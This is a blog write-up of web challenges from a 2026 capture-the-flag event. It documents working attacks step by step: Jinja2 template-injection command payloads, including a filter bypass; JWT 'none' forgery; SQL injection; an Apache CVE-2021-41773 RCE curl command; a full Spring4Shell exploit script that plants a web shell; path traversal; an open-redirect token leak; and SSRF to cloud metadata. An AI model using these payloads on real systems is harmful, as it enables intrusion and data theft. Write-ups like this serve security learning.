---
layout: post
title:  "Web Challenges"
date:   2026-06-22 12:55:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /RIFFHACK-CTF-2026-web/
---
* TOC
{:toc}
{% raw %}

## Vault-Tec Overseer Terminal

**Category**: Web Exploit

**Difficulty**: medium

**Description**: A RobCo Termlink for Vault 101 lets residents personalize a terminal greeting. Enroll as an ordinary resident and recover the Overseer's sealed directive.

I go to the site and register an account:
```http
POST /enroll HTTP/1.1
Host: world-0474648096204efa84c346e681-z6ajr.ondigitalocean.app
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://world-0474648096204efa84c346e681-z6ajr.ondigitalocean.app/enroll
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://world-0474648096204efa84c346e681-z6ajr.ondigitalocean.app
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

vault_id=uzi&access_code=12345678
```

Now I'm on `/terminal`:

![Alt text](/images/riffhackweb1.png)

I dont have permissions to access `/overseer`:

![Alt text](/images/riffhackweb2.png)

On `/inscribe` I can edit the terminal greeting:

![Alt text](/images/riffhackweb3.png)

I tried entering `{{7*'7'}}` and it returned `7777777`. They are using the Jinja2 templating engine. 

I confirm RCE with:
```shell
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

It returns: `uid=999(ctf) gid=999(ctf) groups=999(ctf)`! 

I run `ls` and see:
```shell
app.py requirements.txt
```

Finally I sent:
```shell
{{ config.__class__.__init__.__globals__['os'].popen('cat app.py').read() }}
```

The flag is at the top of `app.py`:

![Alt text](/images/riffhackweb4.png)

`bitctf{{w4r_n3v3r_ch4ng3s_0verseer_t3rm1nal_pwn3d}}`

___

## The Crawler's Courtesy

**Category**: Web Exploit

**Difficulty**: easy

**Description**: The marketplace tried to politely hide one operator scrap from search engines. Courtesy files are not access control, and crawlers are not the only ones who can read them.

```shell
curl http://159.89.230.27/robots.txt  
User-Agent: *  
Allow: /  
Disallow: /operator-cache-drop
```

On `/operator-cache-drop`:

![Alt text](/images/riffhackweb5.png)

`bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}`

___

## The Vendor's Secret Door

**Category**: Web Exploit

**Difficulty**: medium

**Description**: You're browsing the underground marketplace, but you're just a regular buyer. Some users claim they've found a way to access vendor-only areas. Can you figure out how?

I am able to login to the site with anything. When I login I am assigned a JWT. I tried a algorithm downgrade attack. Normal JWT header and claims:
```shell
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "id": "n9q4wr",
  "email": "admin@anything.com",
  "isVendor": false,
  "iat": 1781888704,
  "exp": 1782493504
}
```

I change the algorithm to `none` and change `isVendor` to `true`. When I update my JWT in my browser I can see the vendor panel on `http://159.89.230.27/dashboard`. On `/vendor`:

![Alt text](/images/riffhackweb6.png)

`bitflag{jwt_5h4ll_n0t_p455}`

___

## The Loose Ledger

**Category**: Web Exploit

**Difficulty**: easy

**Description**: A buyer lookup tool is meant to retrieve one order at a time, but a loose query turns a single reference check into a wider ledger leak.

On `/orders` you can search order references using IDs like `escrow-1042`. I tried searching for `' OR 1=1--` and I got access to all orders. On `http://159.89.230.27/orders?ref=%27%20OR%201%3D1--`:

![Alt text](/images/riffhackweb7.png)

`bitflag{1nj3ct10n_turn5_4_l00kup_1nt0_4_l34k}`

___

## The Great Discount Heist

**Category**: Web Exploit

**Difficulty**: easy

**Description**: Expensive tools shouldn't be free, but some users claim they've found a way. Can you discover their secret?

I found the flag on `view-source:http://159.89.230.27/listing/macro-builder`:
```shell
... etc 
{\"listing\":{\"id\":\"macro-builder\",\"name\":\"OfficePhish Pro\",\"summary\":\"Professional macro-based phishing templates. 95% success rate in corporate environments.\",\"body\":\"$19\",\"vendor\":\"riffhack-labs\",\"status\":\"published\",\"tags\":[\"macro\",\"phishing\",\"social-engineering\"]},\"couponFlag\":\"bitflag{c0up0n_st4ck1ng_1s_4_d34l}\"} 
... etc
```

`bitflag{c0up0n_st4ck1ng_1s_4_d34l}`

___

## The Exposed Orders

**Category**: Web Exploit

**Difficulty**: easy

**Description**: Order history should be private, but the marketplace leaves a few loose threads. Can you follow one to something that is not yours?

On any of the product pages, there are reviews you can read. Below them are UIDs. I find 3:
```shell
abc12
k7m3n
xyz78
```

I forged a jwt like this:
```shell
{
  "alg": "none",
  "typ": "JWT"
}
{
  "id": "k7m3n",
  "email": "email@email.com",
  "isVendor": true,
  "iat": 1781888125,
  "exp": 1782492925
}
```

Now when I go to `http://159.89.230.27/orders` I can see their purchase history:

![Alt text](/images/riffhackweb8.png)

`bitflag{1d0r_1s_4_d4ng3r0us_g4m3}`

___

## InGen Systems Archive Breach

**Category**: Web Exploit

**Difficulty**: medium

**Description**: InGen Systems has brought their dinosaur research archives online. The island's legacy web infrastructure hosts a public-facing specimen catalogue. Something about the way old URLs are resolved makes Dr. Malcolm uneasy. Life finds a way out of any cage.

I go to the website:

![Alt text](/images/riffhackweb9.png)

Wappalyzer tells me they are running `Apache HTTP Server 2.4.49`. From I quick search I find it might be vulnerable to `CVE-2021-42013` or `CVE-2021-41773`.

[https://www.exploit-db.com/exploits/50383](https://www.exploit-db.com/exploits/50383)

Eventually I find RCE:
```shell
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; id" "http://144.126.234.248/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"  
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

I looked around the server for a while until I found the flag at `/opt/ingen/flag.txt`:
```shell
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; cat /opt/ingen/flag.txt" "http://144.126.234.248/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"  
bitctf{{l1f3_f1nds_4_w4y_CVE_2021_41773}}
```

`bitctf{{l1f3_f1nds_4_w4y_CVE_2021_41773}}`

___

## The Return Slip

**Category**: Web Exploit

**Difficulty**: easy

**Description**: The login desk is happy to send buyers back where they came from. If the return address is trusted too much, something extra may tag along.

I went to login page at `http://159.89.230.27/auth` and changed the link to :`http://159.89.230.27/auth?callbackUrl=https://webhook.site/ID`

I read about this on [https://next-auth.js.org/configuration/callbacks](https://next-auth.js.org/configuration/callbacks).

Once I login I get redirected to my webhook!
```shell
https://webhooksite.net/ID?handoff=bitflag%7Btru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts%7D
```

`bitflag{tru5t3d_r3d1r3cts_c4n_c4rry_s3cr3ts}`

___

## Ghostbusters Template Possession

**Category**: Web Exploit

**Difficulty**: medium

**Description**: Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide.

I go to the website:

![Alt text](/images/riffhackweb10.png)

`{{7*'7'}}` confirms Jinja2 SSTI:

![Alt text](/images/riffhackweb11.png)

I started testing different payloads. Things like `{{ config }}`, `{{ self }}`, and `{{ request }}` are blocked. 

`{{ ''.__class__ }}` returns `<class 'str'>` so I know dunders are not blocked. 

`{{ ''.__class__.__mro__[1].__subclasses__() }}` returns all the classes. 

Eventually I get this working payload:
```shell
{{ (''['__clas'+'s__']['__mr'+'o__'][1]['__subcl'+'asses__']()[-1]('id', shell=True, stdout=-1))['comm'+'unicate']()[0] }}
```

![Alt text](/images/riffhackweb12.png)

I assume the filter is a blacklist regex that scans your raw input string for certain dangerous keywords. By using string concatenation the filter should not be able to appropriately filter out the dangerous content. 

I get the flag with: 
```shell
{{ (''['__clas'+'s__']['__mr'+'o__'][1]['__subcl'+'asses__']()[-1]('cat app.py', shell=True, stdout=-1))['comm'+'unicate']()[0] }}
```

- `''` starts with an empty string
- `['__clas'+'s__']` builds the string `"__class__"` and gives you access to the `str` class
- `['__mr'+'o__'][1]` builds `"__mro__"` and accesses the Method Resolution Order (and takes index `1`) which gives you the root `object` class
- `['__subcl'+'asses__']()` builds `"__subclasses__"` and calls it which returns a list of every class in memory
- `[-1]` takes the very last class in the list. I saw the output for that earlier, and the last class was `<class 'subprocess.Popen'>`!
- `('cat app.py', shell=True, stdout=-1)` instantiates `Popen` and tells it to run the command via the shell. It captures the output by setting standard out to a pipe (`-1` is the pipe file descriptor).
- `['comm'+'unicate']()[0]` builds `"communicate"`, calls it, and takes index `0` of the returned tuple (aka the commands standard output).

![Alt text](/images/riffhackweb13.png)

`bitctf{{gh057ly_j1nj4_p0ss35510n}}`

___

## Helicarrier Breach

**Category**: Web Exploit

**Difficulty**: medium

**Description**: S.H.I.E.L.D.'s Helicarrier Personnel Registry is still running an aging internal platform on the carrier network. HYDRA believes the registry is exposing more than it should. Find a way in and recover the Director's sealed dossier.

After about an hour of looking around I found the site is vulnerable to `CVE-2022-22965`. I found a POC here: [https://github.com/reznok/Spring4Shell-POC](https://github.com/reznok/Spring4Shell-POC)

I downloaded their POC:
```python
# Author: @Rezn0k
# Based off the work of p1n93r

import requests
import argparse
from urllib.parse import urlparse
import time

# Set to bypass errors if the target site has SSL issues
requests.packages.urllib3.disable_warnings()

post_headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

get_headers = {
    "prefix": "<%",
    "suffix": "%>//",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
}


def run_exploit(url, directory, filename):
    log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"

    log_file_suffix = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"
    log_file_dir = f"class.module.classLoader.resources.context.parent.pipeline.first.directory={directory}"
    log_file_prefix = f"class.module.classLoader.resources.context.parent.pipeline.first.prefix={filename}"
    log_file_date_format = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    exp_data = "&".join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])

    # Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times
    # If re-running the exploit, this will create an artifact of {old_file_name}_.jsp
    file_date_data = "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Change the tomcat log location variables
    print("[*] Modifying Log Configurations")
    ret = requests.post(url, headers=post_headers, data=exp_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)

    # Changes take some time to populate on tomcat
    time.sleep(3)

    # Send the packet that writes the web shell
    ret = requests.get(url, headers=get_headers, verify=False)
    print("[*] Response Code: %d" % ret.status_code)

    time.sleep(1)

    # Reset the pattern to prevent future writes into the file
    pattern_data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern="
    print("[*] Resetting Log Variables.")
    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=False)
    print("[*] Response code: %d" % ret.status_code)


def main():
    parser = argparse.ArgumentParser(description='Spring Core RCE')
    parser.add_argument('--url', help='target url', required=True)
    parser.add_argument('--file', help='File to write to [no extension]', required=False, default="shell")
    parser.add_argument('--dir', help='Directory to write to. Suggest using "webapps/[appname]" of target app',
                        required=False, default="webapps/ROOT")

    file_arg = parser.parse_args().file
    dir_arg = parser.parse_args().dir
    url_arg = parser.parse_args().url

    filename = file_arg.replace(".jsp", "")

    if url_arg is None:
        print("Must pass an option for --url")
        return

    try:
        run_exploit(url_arg, dir_arg, filename)
        print("[+] Exploit completed")
        print("[+] Check your target for a shell")
        print("[+] File: " + filename + ".jsp")

        if dir_arg:
            location = urlparse(url_arg).scheme + "://" + urlparse(url_arg).netloc + "/" + filename + ".jsp"
        else:
            location = f"Unknown. Custom directory used. (try app/{filename}.jsp?cmd=id"
        print(f"[+] Shell should be at: {location}?cmd=id")
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
```

Running the POC:
```shell
python3 exploit.py --url https://world-389ba051ca0440e9aa50d60622-8bz3x.ondigitalocean.app/search --file tomcatwar  
[*] Resetting Log Variables.  
[*] Response code: 200  
[*] Modifying Log Configurations  
[*] Response code: 200  
[*] Response Code: 200  
[*] Resetting Log Variables.  
[*] Response code: 200  
[+] Exploit completed  
[+] Check your target for a shell  
[+] File: tomcatwar.jsp  
[+] Shell should be at: https://world-389ba051ca0440e9aa50d60622-8bz3x.ondigitalocean.app/tomcatwar.jsp?cmd=id
```

Confirm RCE:
```shell
curl "https://world-389ba051ca0440e9aa50d60622-8bz3x.ondigitalocean.app/tomcatwar.jsp?cmd=id" > id.txt  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100  2563  100  2563    0     0   2397      0  0:00:01  0:00:01 --:--:--  2399

cat id.txt | head -n 1  
uid=0(root) gid=0(root) groups=0(root)
```

The flag was an environment variable:
```shell
curl "https://world-389ba051ca0440e9aa50d60622-8bz3x.ondigitalocean.app/tomcatwar.jsp?cmd=env" > env.txt  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100 43190    0 43190    0     0  43992      0 --:--:-- --:--:-- --:--:-- 43981

cat env.txt | head -n 15  
KUBERNETES_SERVICE_PORT_HTTPS=  
KUBERNETES_SERVICE_PORT=  
HOSTNAME=web-7bcb9b66f9-xm9st  
LANGUAGE=en_US:en  
JAVA_HOME=/opt/java/openjdk  
GPG_KEYS=48F8E69F6390C9F25CFEDCD268248959359E722B A9C5DF4D22E99998D9875A5110C01C5A2F6059E7 DCFD35E0BF8CA7344752DE8B6FB21E8933C60243  
PWD=/usr/local/tomcat  
PORT=8080  
TOMCAT_SHA512=a4d43ac45f76e29d3dea23a2712c7570a11419aad7a1af2d1533454709c020b59666c7f9e063a77120224e0cbd4020cac06ca596dda7057cacb9a8a7e6d73eea  
TOMCAT_MAJOR=9  
HOME=/root  
LANG=en_US.UTF-8  
KUBERNETES_PORT_443_TCP=  
TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib  
FLAG=bitctf{{sp4_sh3ll_h3l1carr13r_0wn3d}}
```

`bitctf{{sp4_sh3ll_h3l1carr13r_0wn3d}}`

___

## The Proof Locker

**Category**: Web Exploit

**Difficulty**: medium

**Description**: Proof files live behind a tidy preview endpoint, but not every path stays where it belongs once the locker door is cracked open.

On the market users are able to leave reviews with images attached. You can view proof of their exploit like this:
```shell
curl http://134.209.117.21/api/reviews/proof?proof=rat-builder/domain_admin.png  
proof-capture: domain escalation summary  
operator: cyberghost  
status: validated
```

I checked `/etc/passwd`:
```shell
curl http://134.209.117.21/api/reviews/proof?proof=../../../../etc/passwd  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
node:x:1000:1000::/home/node:/bin/bash  
nextjs:x:1001:65534::/nonexistent:/usr/sbin/nologin  
opsflag:x:1337:1337:bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}:/nonexistent:/usr/sbin/nologin
```

`bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}`

___

## The Trusting Verifier

**Category**: Web Exploit

**Difficulty**: medium

**Description**: Vendors must prove their legitimacy to join the marketplace. Some have discovered the verification process can peek into places it shouldn't. What secrets lie behind the check?

On `http://134.209.117.21/vendor-application` users can apply to become a vendor:

![Alt text](/images/riffhackweb14.png)

You can enter a website and click `Verify` to make a `POST` request to `/api/vendor/verify-website`. I entered a webhook and when I clicked `Verify` it made a request to it!

`file://` was blocked. `http://127.0.0.1:3000/` returned the homepage. 

Eventually I tried making a request to `http://169.254.169.254/latest/user-data`. That IP address is a link local address used by AWS (and also by GCP, Azure, etc.) for their Instance Metadata Service (IMDS). From inside an instance, any HTTP request to that IP returns information about the running virtual machine. 

Request:
```http
POST /api/vendor/verify-website HTTP/1.1
Host: 134.209.117.21
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://134.209.117.21/vendor-application
Content-Type: application/json
Content-Length: 53
Origin: http://134.209.117.21
DNT: 1
Connection: keep-alive
Cookie: auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImU4Z21hIiwiZW1haWwiOiJpZGtAaWRrLmNvbSIsImlzVmVuZG9yIjpmYWxzZSwiaWF0IjoxNzgxOTg2MTIyLCJleHAiOjE3ODI1OTA5MjJ9.V1QJXxapBSY5QXjJV-w-AUQBzdtYsQ0k9jt95rXjLGs
Priority: u=0

{"website":"http://169.254.169.254/latest/user-data"}
```

Response:
```http
HTTP/1.1 200 OK
vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
content-type: application/json
Date: Sat, 20 Jun 2026 21:04:45 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 189

{"success":true,"message":"Website verification successful","body":"#!/bin/sh\nexport MARKETPLACE_ENV=ctf\nexport TRUSTING_VERIFIER_FLAG=bitflag{ssrf_1s_4_p4rty_cr4sh3r}\nnode server.js\n"}
```

`bitflag{ssrf_1s_4_p4rty_cr4sh3r}`

{% endraw %}